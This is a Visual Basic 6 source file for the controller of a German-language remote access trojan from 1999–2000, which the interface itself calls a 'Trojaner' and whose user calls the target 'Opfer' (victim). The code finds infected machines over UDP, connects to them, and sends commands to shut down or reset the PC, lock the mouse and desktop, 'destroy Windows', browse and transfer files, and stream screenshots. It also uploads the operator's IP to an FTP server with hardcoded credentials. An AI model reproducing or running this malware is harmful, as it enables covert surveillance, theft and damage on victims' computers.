         BeginProperty Buttons {66833FE8-8583-11D1-B16A-00C0F0283628} 
            NumButtons      =   1
            BeginProperty Button1 {66833FEA-8583-11D1-B16A-00C0F0283628} 
               ImageIndex      =   10
            EndProperty
         EndProperty
      End
      Begin MSComctlLib.Toolbar toolBar 
         Height          =   570
         Index           =   12
         Left            =   3960
         TabIndex        =   39
         Top             =   480
         Visible         =   0   'False
         Width           =   795
         _ExtentX        =   1402
         _ExtentY        =   1005
         ButtonWidth     =   1032
         ButtonHeight    =   1005
         Style           =   1
         ImageList       =   "ilTool"
         _Version        =   393216
         BeginProperty Buttons {66833FE8-8583-11D1-B16A-00C0F0283628} 
            NumButtons      =   1
            BeginProperty Button1 {66833FEA-8583-11D1-B16A-00C0F0283628} 
               ImageIndex      =   8
            EndProperty
         EndProperty
      End
      Begin MSComctlLib.Toolbar toolBar 
         Height          =   570
         Index           =   15
         Left            =   3960
         TabIndex        =   40
         Top             =   1440
         Visible         =   0   'False
         Width           =   795
         _ExtentX        =   1402
         _ExtentY        =   1005
         ButtonWidth     =   1032
         ButtonHeight    =   1005
         Style           =   1
         ImageList       =   "ilTool"
         _Version        =   393216
         BeginProperty Buttons {66833FE8-8583-11D1-B16A-00C0F0283628} 
            NumButtons      =   1
            BeginProperty Button1 {66833FEA-8583-11D1-B16A-00C0F0283628} 
               ImageIndex      =   9
            EndProperty
         EndProperty
      End
      Begin MSComctlLib.Toolbar toolBar 
         Height          =   570
         Index           =   18
         Left            =   3960
         TabIndex        =   41
         Top             =   2400
         Visible         =   0   'False
         Width           =   795
         _ExtentX        =   1402
         _ExtentY        =   1005
         ButtonWidth     =   1032
         ButtonHeight    =   1005
         Style           =   1
         ImageList       =   "ilTool"
         _Version        =   393216
         BeginProperty Buttons {66833FE8-8583-11D1-B16A-00C0F0283628} 
            NumButtons      =   1
            BeginProperty Button1 {66833FEA-8583-11D1-B16A-00C0F0283628} 
               ImageIndex      =   10
            EndProperty
         EndProperty
      End
      Begin MSComctlLib.Toolbar toolBar 
         Height          =   570
         Index           =   3
         Left            =   -71040
         TabIndex        =   42
         Top             =   480
         Width           =   915
         _ExtentX        =   1614
         _ExtentY        =   1005
         ButtonWidth     =   1032
         ButtonHeight    =   1005
         Style           =   1
         ImageList       =   "iTooloff"
         HotImageList    =   "ilTool"
         _Version        =   393216
         BeginProperty Buttons {66833FE8-8583-11D1-B16A-00C0F0283628} 
            NumButtons      =   1
            BeginProperty Button1 {66833FEA-8583-11D1-B16A-00C0F0283628} 
               ImageIndex      =   6
            EndProperty
         EndProperty
      End
      Begin MSComctlLib.Toolbar toolBar 
         Height          =   570
         Index           =   6
         Left            =   -71040
         TabIndex        =   43
         Top             =   1440
         Width           =   915
         _ExtentX        =   1614
         _ExtentY        =   1005
         ButtonWidth     =   1032
         ButtonHeight    =   1005
         Style           =   1
         ImageList       =   "iTooloff"
         HotImageList    =   "ilTool"
         _Version        =   393216
         BeginProperty Buttons {66833FE8-8583-11D1-B16A-00C0F0283628} 
            NumButtons      =   1
            BeginProperty Button1 {66833FEA-8583-11D1-B16A-00C0F0283628} 
               ImageIndex      =   13
            EndProperty
         EndProperty
      End
      Begin MSComctlLib.Toolbar toolBar 
         Height          =   570
         Index           =   8
         Left            =   -72720
         TabIndex        =   44
         Top             =   2400
         Width           =   915
         _ExtentX        =   1614
         _ExtentY        =   1005
         ButtonWidth     =   1032
         ButtonHeight    =   1005
         Style           =   1
         ImageList       =   "iTooloff"
         HotImageList    =   "ilTool"
         _Version        =   393216
         BeginProperty Buttons {66833FE8-8583-11D1-B16A-00C0F0283628} 
            NumButtons      =   1
            BeginProperty Button1 {66833FEA-8583-11D1-B16A-00C0F0283628} 
               ImageIndex      =   9
            EndProperty
         EndProperty
      End
      Begin VB.Label Label18 
         Alignment       =   2  'Zentriert
         BackStyle       =   0  'Transparent
         Caption         =   "Passwörter anzeigen"
         ForeColor       =   &H00000000&
         Height          =   255
         Left            =   -73320
         TabIndex        =   62
         Top             =   3000
         Width           =   1800
      End
      Begin VB.Label Label17 
         Alignment       =   2  'Zentriert
         BackStyle       =   0  'Transparent
         Caption         =   "Desktop sperren"
         ForeColor       =   &H00000000&
         Height          =   255
         Left            =   -71640
         TabIndex        =   61
         Top             =   2040
         Width           =   1800
      End
      Begin VB.Label Label16 
         Alignment       =   2  'Zentriert
         BackStyle       =   0  'Transparent
         Caption         =   "Maus sperren"
         ForeColor       =   &H00000000&
         Height          =   255
         Left            =   -71640
         TabIndex        =   60
         Top             =   1080
         Width           =   1800
      End
      Begin VB.Label Label15 
         Alignment       =   2  'Zentriert
         BackStyle       =   0  'Transparent
         Caption         =   "CD-ROM öffnen"
         ForeColor       =   &H00000000&
         Height          =   255
         Left            =   3360
         TabIndex        =   59
         Top             =   3000
         Visible         =   0   'False
         Width           =   1800
      End
      Begin VB.Label Label14 
         Alignment       =   2  'Zentriert
         BackStyle       =   0  'Transparent
         Caption         =   "Passwörter anzeigen"
         ForeColor       =   &H00000000&
         Height          =   255
         Left            =   3360
         TabIndex        =   58
         Top             =   2040
         Visible         =   0   'False
         Width           =   1800
      End
      Begin VB.Label Label13 
         Alignment       =   2  'Zentriert
         BackStyle       =   0  'Transparent
         Caption         =   "Druckerfunktionen"
         ForeColor       =   &H00000000&
         Height          =   255
         Left            =   3360
         TabIndex        =   57
         Top             =   1080
         Visible         =   0   'False
         Width           =   1800
      End
      Begin VB.Label Label12 
         Alignment       =   2  'Zentriert
         BackStyle       =   0  'Transparent
         Caption         =   "Auflösung verändern"
         ForeColor       =   &H00000000&
         Height          =   255
         Left            =   -73320
         TabIndex        =   56
         Top             =   1080
         Width           =   1800
      End
      Begin VB.Label Label11 
         Alignment       =   2  'Zentriert
         BackStyle       =   0  'Transparent
         Caption         =   "Trojaner beenden"
         ForeColor       =   &H00000000&
         Height          =   255
         Left            =   -73320
         TabIndex        =   55
         Top             =   2040
         Width           =   1800
      End
      Begin VB.Label Label10 
         Alignment       =   2  'Zentriert
         BackStyle       =   0  'Transparent
         Caption         =   "Datei-Explorer"
         ForeColor       =   &H00000000&
         Height          =   255
         Left            =   -74880
         TabIndex        =   54
         Top             =   3000
         Width           =   1560
      End
      Begin VB.Label Label9 
         Alignment       =   2  'Zentriert
         BackStyle       =   0  'Transparent
         Caption         =   "PC herunterfahren"
         ForeColor       =   &H00000000&
         Height          =   255
         Left            =   -75000
         TabIndex        =   53
         Top             =   1080
         Width           =   1800
      End
      Begin VB.Label Label8 
         Alignment       =   2  'Zentriert
         BackStyle       =   0  'Transparent
         Caption         =   "PC neustarten"
         ForeColor       =   &H00000000&
         Height          =   255
         Left            =   -75000
         TabIndex        =   52
         Top             =   2040
         Width           =   1800
      End
      Begin VB.Label Label7 
         Alignment       =   2  'Zentriert
         BackStyle       =   0  'Transparent
         Caption         =   "Taskleiste verstecken"
         ForeColor       =   &H00000000&
         Height          =   255
         Left            =   -71640
         TabIndex        =   51
         Top             =   3000
         Width           =   1800
      End
      Begin VB.Label Label6 
         Alignment       =   2  'Zentriert
         BackStyle       =   0  'Transparent
         Caption         =   "Druckerfunktionen"
         ForeColor       =   &H00000000&
         Height          =   255
         Left            =   1680
         TabIndex        =   50
         Top             =   1080
         Width           =   1800
      End
      Begin VB.Label Label5 
         Alignment       =   2  'Zentriert
         BackStyle       =   0  'Transparent
         Caption         =   "Warnmeldung senden"
         ForeColor       =   &H00000000&
         Height          =   255
         Left            =   1680
         TabIndex        =   49
         Top             =   2040
         Width           =   1800
      End
      Begin VB.Label Label4 
         Alignment       =   2  'Zentriert
         BackStyle       =   0  'Transparent
         Caption         =   "Screenshot-Stream"
         ForeColor       =   &H00000000&
         Height          =   255
         Left            =   1680
         TabIndex        =   48
         Top             =   3000
         Width           =   1800
      End
      Begin VB.Label Label3 
         Alignment       =   2  'Zentriert
         BackStyle       =   0  'Transparent
         Caption         =   "CD-ROM öffnen"
         ForeColor       =   &H00000000&
         Height          =   255
         Left            =   0
         TabIndex        =   47
         Top             =   3000
         Width           =   1800
      End
      Begin VB.Label Label2 
         Alignment       =   2  'Zentriert
         BackStyle       =   0  'Transparent
         Caption         =   "Tastatur-LEDs an"
         ForeColor       =   &H00000000&
         Height          =   255
         Left            =   0
         TabIndex        =   46
         Top             =   2040
         Width           =   1800
      End
      Begin VB.Label Label1 
         Alignment       =   2  'Zentriert
         BackStyle       =   0  'Transparent
         Caption         =   "Chat"
         ForeColor       =   &H00000000&
         Height          =   255
         Left            =   0
         TabIndex        =   45
         Top             =   1080
         Width           =   1800
      End
   End
   Begin MSComctlLib.ImageList imageList16 
      Left            =   4080
      Top             =   1560
      _ExtentX        =   1005
      _ExtentY        =   1005
      BackColor       =   -2147483643
      ImageWidth      =   16
      ImageHeight     =   16
      MaskColor       =   12632256
      _Version        =   393216
      BeginProperty Images {2C247F25-8591-11D1-B16A-00C0F0283628} 
         NumListImages   =   3
         BeginProperty ListImage1 {2C247F27-8591-11D1-B16A-00C0F0283628} 
            Picture         =   "client.frx":1520E
            Key             =   ""
         EndProperty
         BeginProperty ListImage2 {2C247F27-8591-11D1-B16A-00C0F0283628} 
            Picture         =   "client.frx":1536A
            Key             =   ""
         EndProperty
         BeginProperty ListImage3 {2C247F27-8591-11D1-B16A-00C0F0283628} 
            Picture         =   "client.frx":154CA
            Key             =   ""
         EndProperty
      EndProperty
   End
   Begin VB.Label Label24 
      Alignment       =   2  'Zentriert
      Caption         =   "1999-2000"
      Height          =   255
      Left            =   4260
      TabIndex        =   11
      Top             =   1620
      Width           =   1395
   End
   Begin VB.Label Label22 
      Alignment       =   2  'Zentriert
      Caption         =   "Freak Software"
      Height          =   255
      Left            =   4260
      TabIndex        =   10
      Top             =   1320
      Width           =   1395
   End
   Begin VB.Image Image2 
      Height          =   855
      Left            =   4200
      Picture         =   "client.frx":15DA6
      Top             =   300
      Width           =   1500
   End
   Begin VB.Label lblStat2 
      Alignment       =   2  'Zentriert
      Caption         =   "nicht verbunden"
      BeginProperty Font 
         Name            =   "MS Sans Serif"
         Size            =   8.25
         Charset         =   0
         Weight          =   700
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H000000FF&
      Height          =   255
      Left            =   7140
      TabIndex        =   9
      Top             =   1680
      Width           =   2055
   End
   Begin VB.Label lblStat 
      Alignment       =   1  'Rechts
      Caption         =   "Status:"
      Height          =   255
      Left            =   6360
      TabIndex        =   8
      Top             =   1680
      Width           =   615
   End
   Begin VB.Label lblIP 
      Alignment       =   1  'Rechts
      Caption         =   "Remote Host:"
      Height          =   180
      Left            =   5880
      TabIndex        =   4
      Top             =   525
      Width           =   1095
   End
   Begin VB.Label lblName 
      Alignment       =   1  'Rechts
      Caption         =   "Verbinden mit:"
      Height          =   180
      Left            =   5880
      TabIndex        =   3
      Top             =   180
      Width           =   1095
   End
   Begin VB.Image imgConnected 
      Height          =   210
      Left            =   2580
      Top             =   9990
      Visible         =   0   'False
      Width           =   420
   End
   Begin VB.Image imgDisConnected 
      Height          =   210
      Left            =   2580
      Top             =   9990
      Width           =   420
   End
   Begin VB.Label lblConnected 
      BorderStyle     =   1  'Fest Einfach
      Height          =   360
      Left            =   2460
      TabIndex        =   0
      Top             =   9900
      Width           =   735
   End
End
Attribute VB_Name = "Server"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
'Verzeichnis der Sendecodes:



'0: Funkkontakt zwischen Client und Server
'   01: Anfrage des Client auf Verbindung
'   02: Bestätigung des Server
'   08+09: Trennen

'1: Dateioperationen
'   11: Anfrage des Client auf Senden
'   12: Bestätigung des Server
'   13: Datei direkt ausführen
'   14: Senden des Pfads
'   15: Bestätigung
'   16: ---
'   17: Datei korrekt empfangen - Server->Client
'       bzw. Bereit zum Senden - Client->Server
'   18: Datei nicht korrekt empfangen - Server->Client
'   19: Server->Client - ok. zum Senden von Daten

'2: Chat
'   21: Anfrage
'   22: Bestätigung
'   23: ---
'   24: Text
'   25-28: ---
'   29: Seite hat Chat beendet

'3: Weitere Funktionen
'   31: Warnmeldung
'   32: ---
'   33: MDZ abspielen
'   34: KES abspielen
'   35: ---
'   36: Shutdown
'   37: Reset
'   38: ---
'   39: Windows zerstören
'   40: Auflösung in 320*240 ändern
'   41: Maus sperren
'   42: Maus entsperren
'   43: Desktop sperren
'   44: Desktop entsperren

'6: Explorer
'   61: Anfrage
'   62: Bestätigung
'   63: Hintergrund ändern
'   64: C->S: Pfad senden
'   65: C->S: Laufwerk senden
'   66: ---
'   67: S->C: Datei senden
'   68: S->C: Pfad senden
'   69: S->C: Laufwerk senden
'   70: CD-Rom Laufwerk öffnen
'   71: CD-Rom Laufwerk schließen
'   80:

'7: Dateiansicht
'   81: Starten der Pfadübermittlung
'   82: Lichter an
'   83: Lichter aus
'   84: Druckerfunktion
'   85:
'   86:
'   87:
'   88:
'   89: Server beenden

' 5: ???
'   51: Hide Taskbar
'   52: Show Taskbar
'   53: Auflösung ändern

Dim FileLenght As Long
Dim animate As Integer
Dim tbPressed(1 To 18) As Boolean
Dim IndexX As Integer
Dim iStatus As Integer
Dim indx As Integer



Private Sub cmdConnection_Click(ByVal ClickReason As FlatButton.b2kClickReason)

  If cmdConnection.Caption = "Verbindung herstellen" Then
    Connect
  Else
    DisConnect
  End If
  
End Sub







Private Sub Form_Click()

    listIP.ListItems.Clear
    
End Sub



Private Sub Form_Load()

  lblNoInfo.Caption = "Keine" + Chr(13) + Chr(10) + "Info" + Chr(13) + Chr(10) + "vorhanden!"
  lblPCName.Visible = False
  lblPCNamei.Visible = False
  lblPCIP.Visible = False
  lblPCIPi.Visible = False
  lblVersion.Visible = False
  lblVersioni.Visible = False
  
  With udpSock
      .RemoteHost = "255.255.255.255"
      .RemotePort = 8569
      .Bind 8570
  End With
  
  txtName.Text = udpSock.LocalHostName
  txtIP.Text = udpSock.LocalIP
  txtLocalIP.Text = udpSock.LocalIP
  Server.Top = Screen.Height - 7000
  Server.Left = Screen.Width - 6800
  lblStat2.ForeColor = RGB(255, 0, 0)
  animate = 1
  imgConnection.Picture = ilAnimate.ListImages.Item(1).Picture
  
  For i = 1 To 18
      toolBar(i).Enabled = False
  Next i
  
  
End Sub



Private Sub Form_Unload(Cancel As Integer)

  End

End Sub





Private Sub lblRecB_Click()
End Sub




Private Sub listIP_DblClick()

  If cmdConnection.Enabled = True Then
    If Not lblName.Caption = "Verbunden mit:" Then
      Connect
    End If
  End If

End Sub



Private Sub listIP_ItemClick(ByVal Item As MSComctlLib.ListItem)

  If cmdConnection.Enabled = True Then
    If Not lblName.Caption = "Verbunden mit:" Then
      lblNoInfo.Visible = False
      lblPCName.Visible = True
      lblPCNamei.Visible = True
      lblPCIP.Visible = True
      lblPCIPi.Visible = True
      lblVersion.Visible = True
      lblVersioni.Visible = True
      txtName = listIP.SelectedItem.Text
      txtIP = listIP.SelectedItem.SubItems(1)
      lblPCNamei = listIP.SelectedItem.Text
      lblPCIPi = listIP.SelectedItem.SubItems(1)
      lblVersioni = listIP.SelectedItem.SubItems(2)
    End If
  End If
  
End Sub






Private Sub tmrIP_Timer()

'Dim GetFile As String
'GetFile = Inet1.OpenURL("Http://www.freak2000.purespace.de/SH.txt", 0)
'    List1.Clear
'    List1.AddItem GetFile

If listIP.ListItems.Count > indx Then
    MsgBox "Neue User Online", vbInformation, "New User!"
End If
  indx = listIP.ListItems.Count

  listIP.ListItems.Clear
  
End Sub

Private Sub tmrAnimate_Timer()

  If animate = 5 Then
    imgConnection.Picture = ilAnimate.ListImages.Item(1).Picture
      animate = 1
  Else
    animate = animate + 1
    imgConnection.Picture = ilAnimate.ListImages.Item(animate).Picture
  End If
  
End Sub



Private Sub tmrEnde_Timer()

  wsoWinsock.Close
  
  For i = 1 To 18
      toolBar(i).Enabled = False
  Next i
  
  tmrEnde.Enabled = False
  tmrAnimate.Enabled = False
  imgConnection.Picture = ilAnimate.ListImages.Item(1).Picture
  lblName.Caption = "Verbinden mit:"
  txtIP.Enabled = True
  cmdConnection.Caption = "Verbindung herstellen"
  cmdConnection.Enabled = True
  lblStat2.Caption = "nicht verbunden"
  lblStat2.ForeColor = RGB(255, 0, 0)
  Server.MousePointer = 0

End Sub



Private Sub tmrTimeOut_Timer()

  On Error GoTo err
  wsoWinsock.SendData ("xx")
  Exit Sub
  
err:
    MsgBox _
      ("Der Client auf der Gegenseite reagiert nicht mehr! Verbindung wurde getrennt!")
    Close #1
    DisConnect

End Sub



Private Sub toolBar_ButtonClick(Index As Integer, ByVal Button As MSComctlLib.Button)
  Dim Busy As Boolean
  Dim flag As Boolean
  
  Select Case Index
    
    Case 0
    Inet1.Cancel
    On Error GoTo fehler
        Kill "SH.txt"
        Inet1.URL = "www.freak2000.purespace.de"
        Inet1.UserName = "p573879"
        Inet1.Password = "bfff00ef"
        Busy = True

      Dim pdatei As String
'      pdatei = Inet1.OpenURL("http://www.freak2000.purespace.de/sh.txt")
'
'      Open "sh.txt" For Binary As #2
'        Put 2, , pdatei
'        flag = False
'        For i = 1 To 2 'LOF(2) / 15
'            pdatei = Space(15)
'            Get 2, i * 15 - 14, pdatei
'            If pdatei = txtLocalIP.Text Then
'                flag = True
'            End If
'        If flag = False Then
'            Put 2, , txtLocalIP.Text + Space(15 - Len(txtLocalIP.Text))
'        End If
'        Next i
'        flag = False
'      Close #2
'
 
      Open "sh.txt" For Binary As #2
        Put 2, , txtLocalIP.Text
      Close #2
      
      Inet1.Execute , "DELETE sh.txt"
      MsgBox "IP Hochgeladen!"
      Inet1.Execute , "PUT sh.txt /sh.txt"
      Exit Sub
        
fehler:
      MsgBox "IP-Server nicht erreichbar!"
    Exit Sub
    
    On Error Resume Next
    
   
    Case 1 'PC herunterfahren
      wsoWinsock.SendData ("36")
    
    Case 2 'Auflösung ändern
      frmAuflösung.Show
      
    Case 3 'Maus sperren
      Press Index
      If tbPressed(Index) Then
        wsoWinsock.SendData ("41")
      Else
        wsoWinsock.SendData ("42")
      End If
    
    Case 4 'PC neustarten
      wsoWinsock.SendData ("37")
    
    Case 5 'Hintergrund ändern
      wsoWinsock.SendData ("89")
      DisConnect
      listIP.ListItems.Clear
      
    Case 6 'Desktop sperren
      Press Index
      If tbPressed(Index) Then
        wsoWinsock.SendData ("43")
      Else
        wsoWinsock.SendData ("44")
      End If
      
    Case 7 'Datei-Explorer
      frmExplorer.Show
      wsoWinsock.SendData ("91c:\")
    
    Case 8 'Passwörter anzeigen
    
    Case 9 'Taskleiste verstecken
      Press Index
      If tbPressed(Index) Then
        wsoWinsock.SendData ("51")
      Else
        wsoWinsock.SendData ("52")
      End If
        
    Case 10 'Chat
      Chat.Show
      wsoWinsock.SendData ("21")
        
    Case 11 'Druckerfunktionen
      frmDrucker.Show
    
    Case 13 'Tastatur-LEDs an/aus
      Press Index
      If tbPressed(Index) Then
        wsoWinsock.SendData ("82")
      Else
        wsoWinsock.SendData ("83")
      End If
    
    Case 14 'Warnmeldung senden
      Message.Show

    Case 16 'CD-ROM auf/zu
      Press Index
      If tbPressed(Index) Then
        wsoWinsock.SendData ("70")
      Else
        wsoWinsock.SendData ("71")
      End If
      
    Case 17
      frmScreenshot.Show
        
  End Select
  
End Sub



Private Sub tmrStatus_Timer()

  If iStatus = 12000 Then
    tmrStatus.Enabled = False
    iStatus = 0
    DisConnect
    MsgBox ("Verbindung konnte nicht aufgebaut werden")
  Else
    iStatus = iStatus + 150
  End If
  
End Sub



Private Sub tmrWarte_Timer()

  On Error GoTo err
  
  wsoWinsock.SendData ("01")
  tmrWarte.Enabled = False
err:
  x = 10
End Sub



Private Sub txtIP_KeyPress(KeyAscii As Integer)

  If KeyAscii = vbKeyReturn Then
      Connect
  End If
  
  lblNoInfo.Visible = True
  lblPCNamei.Visible = False
  lblPCIPi.Visible = False
  lblVersioni.Visible = False
  lblVersion.Visible = False
  lblPCIPi.Visible = False
  lblPCName.Visible = False

End Sub





Private Sub txtLocalIP_KeyPress(KeyAscii As Integer)

  Select Case KeyAscii
    Case vbKeyBack, vbKeyDelete
    Case vbKeyReturn
    Case 46, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57
    Case Else
        KeyAscii = 0
  End Select
  
End Sub

Private Sub udpSock_DataArrival(ByVal bytesTotal As Long)

Dim strdata As String
Dim strString As String
Dim flag As Integer
Dim IP As String
Dim name As String
Dim Version As String
Dim nameX As String

flag = 0

udpSock.GetData strdata

strString = Right(strdata, Len(strdata) - 2)
IP = Left(strString, InStr(strString, "-") - 1)
name = Right(strString, Len(strString) - Len(IP) - 1)
nameX = Left(name, Len(name) - 5)
Version = Right(name, 4)

Select Case Left(strdata, 2)
  Case "01", "02"
    For i = 1 To listIP.ListItems.Count
      If listIP.ListItems.Item(i).Text = nameX Then
        flag = 1
      End If
    Next i
    If flag <> 1 Then
      Set li = listIP.ListItems.Add()
      li.Text = nameX
      li.SubItems(1) = IP
      li.SubItems(2) = "v" + Version
      li.SmallIcon = 2
    End If
End Select
  
End Sub




Private Sub wsoWinsock_DataArrival(ByVal bytesTotal As Long)

  On Error Resume Next
  
  Dim RBytes As Long
  Dim strdata As String
  Dim strString As String
  Dim cPuffer As Byte
  Dim i As Integer
  Dim Size As Long
  Dim strJPG As String
  Dim mhöhe As Integer
  Dim mbreite As Integer
  
  RBytes = wsoWinsock.BytesReceived / 1024
  lblRecB.Caption = lblRecB.Caption + RBytes
  
  wsoWinsock.GetData strdata
  tmrClose.Enabled = True
  
  Select Case Left(strdata, 2)
      
    Case "02"
      tmrAnimate.Enabled = False
      imgConnection.Picture = ilAnimate.ListImages.Item(5).Picture
      cmdConnection.Caption = "Verbindung trennen"
      cmdConnection.Enabled = True
      lblStat2.Caption = "verbunden"
      lblStat2.ForeColor = RGB(0, 0, 255)
      lblName.Caption = "Verbunden mit:"
      tmrStatus.Enabled = False
      iStatus = 12000
      tmrTimeOut.Enabled = True
      frmStatus.Visible = False
      Server.MousePointer = 0
      
      For i = 1 To 18
          toolBar(i).Enabled = True
      Next i
      
    Case "11"
      Open SendFilePath For Binary As #1
      wsoWinsock.SendData ("12")
      file = True
      
    Case "12"
      strString = ""
      Do While Not EOF(1)
        Get 1, , cPuffer
        strString = strString + Chr(cPuffer)
        If Len(strString) = 1000 Then
          frmExplorer.Caption = "Datei-Explorer sendet: " + _
            CStr(Int(Loc(1) / LOF(1) * 100)) + " %" + " - " + _
            CStr(Int(Loc(1) / 1024)) + " KB von " + _
            CStr(Int(LOF(1) / 1024)) + " KB"
          frmExplorer.fileProgress.Value = Loc(1) / LOF(1) * 100
          If file = True Then wsoWinsock.SendData ("14" + strString)
          strString = ""
          Exit Do
        End If
      Loop
      If Not strString = "" Then
          frmExplorer.Caption = "Datei-Explorer bereit"
        frmExplorer.fileProgress.Value = 100
        If file = True Then wsoWinsock.SendData ("15" + strString)
        strString = ""
        Close #1
        file = False
        frmExplorer.toolBar(6).Enabled = False
      End If

    Case "16"
      FileLenght = Val(Right(strdata, Len(strdata) - 2))
      wsoWinsock.SendData ("17")
      file = True
        
    Case "17"
      strdata = Right(strdata, 1000)
      Put 1, , strdata
      frmExplorer.fileProgress.Value = Loc(1) / FileLenght * 100
      frmExplorer.Caption = "Datei-Explorer sendet: " + _
        CStr((Int(Loc(1) / FileLenght * 100) * 10) / 10) + " %" _
        + " - " + CStr(Int(Loc(1) / 1024)) + " KB von " + _
        CStr(Int(FileLenght / 1024)) + " KB"
      If file = True Then wsoWinsock.SendData ("17")
        
    Case "18"
      strdata = Right(strdata, Len(strdata) - 2)
      strdata = Left(strdata, Len(strdata) - 1)
      Put 1, , strdata
      Close #1
      Pfad = ""
      frmExplorer.toolBar(6).Enabled = False
      frmExplorer.File1.Refresh
      frmExplorer.Dir1.Refresh
      frmExplorer.Drive1.Refresh
      wsoWinsock.SendData ("91" + frmExplorer.Text1.Text)
      frmExplorer.fileProgress.Value = 100
      frmExplorer.Caption = "Datei-Explorer bereit"
        
    Case "19" 'Bitte um Refresh
      wsoWinsock.SendData ("91" + frmExplorer.Text1.Text)
 
    Case "24" 'Text
      Chat.lstChat.AddItem Right(strdata, Len(strdata) - 3)
      Chat.lstChat.ListIndex = Chat.lstChat.ListCount - 1
      
    Case "29" 'Chat beendet?
      Chat.lstChat.AddItem "Opfer has quit Chat."
    
    Case "92" 'Festplatteninhalt
      harddisk (Right(strdata, Len(strdata) - 2))
      
    Case "95"
      Kill "screenshot.jpg"
      Open "screenshot.jpg" For Binary As #3
      wsoWinsock.SendData ("95")
    
    Case "96"
      strJPG = Right(strdata, Len(strdata) - 2)
      If Len(strJPG) = 1000 Then
        Put 3, , strJPG
        wsoWinsock.SendData ("95")
      Else
        MsgBox ("Fehler")
      End If

      
    Case "97"
      Put 3, , Right(strdata, Len(strdata) - 2)
      Close #3
      frmScreenshot.Image1.Move _
        0, 0, Screen.Width, Screen.Height
      frmScreenshot.Image1.Picture = LoadPicture("screenshot.jpg")
                
  End Select

End Sub



Public Sub DisConnect()

  On Error Resume Next
  
  Server.MousePointer = 11
  
  For i = 1 To 18
      toolBar(i).Enabled = False
  Next i
  
  cmdConnection.Enabled = False
  txtIP.Enabled = False
  wsoWinsock.SendData ("09")
  tmrEnde.Enabled = True
  tmrWarte.Enabled = False
  cmdConnect.Enabled = True
  cmdDisConnect.Enabled = False
  tmrStatus.Enabled = False
  iStatus = 0
  tmrTimeOut.Enabled = False
  
  Close #1

End Sub



Public Sub Connect()

  On Error Resume Next
  
  Dim i As Long
  
  Server.MousePointer = 11
  tmrAnimate.Enabled = True
  txtIP.Enabled = False
  cmdConnection.Enabled = False
  wsoWinsock.RemotePort = 1750
  wsoWinsock.RemoteHost = txtIP.Text
  wsoWinsock.Connect
  tmrWarte.Enabled = True
  iStatus = 0
  tmrStatus.Enabled = True
  
End Sub

Public Sub harddisk(hd As String)

  Dim i As Long
  Dim ii As Integer
  Dim cur As Integer
  Dim stri As String
  Dim current As Integer
  current = 1
  cur = 1
  stri = ""
  Dim nodX As Node
  Set nodX = Nothing
  
  Dim icon As Integer
  
  frmExplorer.Drive.ComboItems.Clear
  frmExplorer.Folder.Nodes.Clear
  frmExplorer.file.Nodes.Clear

  frmExplorer.MousePointer = 11
  
  For i = 1 To Len(frmExplorer.Text1.Text)
    If Mid(frmExplorer.Text1.Text, i, 1) = "\" Then
      If nodX Is Nothing Then
        Set nodX = frmExplorer.Folder.Nodes.Add(, , "a" + CStr(current), stri, 2)
        current = current + 1
        nodX.Expanded = True
      Else
        Set nodX = frmExplorer.Folder.Nodes.Add("a" + CStr(current - 1), tvwChild, "a" + CStr(current), stri, 2)
        current = current + 1
        nodX.Expanded = True
      End If
      stri = ""
    Else
      stri = stri + Mid(frmExplorer.Text1.Text, i, 1)
    End If
  Next i
    
  frmExplorer.Drive.Text = Left(frmExplorer.Text1.Text, 2)

  stri = ""
  i = 0
  
  For i = 1 To Len(hd)
  
  Select Case Mid(hd, i, 1)
  
    Case Chr(1)
      Select Case cur
        Case 1
          frmExplorer.Drive.ComboItems.Add , , stri, 7
        Case 2
          For ii = Len(stri) To 1 Step 0 - 1
            If Mid(stri, ii, 1) = "\" Then
              frmExplorer.Text1.Text = Left(stri, ii)
              stri = Right(stri, Len(stri) - ii)
  
              Exit For
            End If
          Next ii
          Set nodX = frmExplorer.Folder.Nodes.Add("a" + CStr(current - 1), tvwChild, "b" + stri, stri, 1)
            nodX.Expanded = True
        Case 3
          Select Case LCase(Right(stri, 4))
            Case ".zip", ".rar"
              icon = 3
            Case ".exe"
              icon = 4
            Case ".htm", ".xml"
              icon = 5
            Case "html"
              If Right(stri, 5) = ".html" Then
                icon = 5
              Else
                icon = 6
              End If
            Case ".wav", ".mp3", ".mid", "aif"
              icon = 8
            Case ".sys", ".dll", ".ocx", ".drv"
              icon = 9
            Case ".txt", ".dat", ".log"
              icon = 10
            Case ".doc", ".rtf"
              icon = 11
            Case ".bmp", ".jpg", ".gif", ".ico", "jpeg"
              icon = 12
            Case Else
              icon = 6
          End Select
              
          frmExplorer.file.Nodes.Add , , , stri, icon, icon
      End Select
    stri = ""
      
    Case Chr(2)
      Select Case cur
        Case 1
          'frmExplorer.drive.ComboItems.Add , , stri, 7
        Case 3
          frmExplorer.file.Nodes.Add , , , stri, icon, icon
      End Select
    stri = ""
    cur = cur + 1
    
    Case Else
      stri = stri + Mid(hd, i, 1)
          
  End Select
  
  Next i
  
  For i = 1 To frmExplorer.Drive.ComboItems.Count
    If Left(frmExplorer.Drive.ComboItems.Item(i).Text, 2) _
      = Left(frmExplorer.Text1.Text, 2) Then
      Set frmExplorer.Drive.SelectedItem = frmExplorer.Drive.ComboItems.Item(i)
    End If
  Next i
  
  frmExplorer.MousePointer = 0

End Sub



Public Sub Press(Index As Integer)

  If tbPressed(Index) Then
    toolBar(Index).Buttons.Item(1).Value = tbrUnpressed
    tbPressed(Index) = False
  Else
    toolBar(Index).Buttons.Item(1).Value = tbrPressed
    tbPressed(Index) = True
  End If

End Sub
